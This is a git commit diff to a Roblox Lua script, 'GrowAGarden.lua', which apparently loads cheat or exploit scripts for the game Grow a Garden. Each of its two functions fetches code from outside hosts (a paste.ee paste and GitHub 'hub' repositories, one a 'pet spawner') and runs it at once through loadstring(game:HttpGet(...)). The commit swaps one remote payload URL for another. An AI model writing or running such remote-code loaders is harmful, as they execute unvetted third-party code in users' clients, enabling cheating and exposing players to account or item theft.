a4948c1e15146d1c4cb5a9d9e83741ee0c2596cf
vthangsitink <191318345+Day326@users.noreply.github.com>
2025-05-26 19:52:39 +0800

    GrowAGarden.lua

--- GrowAGarden.lua
+++ GrowAGarden.lua
@@ -2,7 +2,7 @@ local function gui()
     loadstring(game:HttpGet("https://paste.ee/r/EJjqjqGq"))()
 end
 local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
 end
  
 task.spawn(gui)
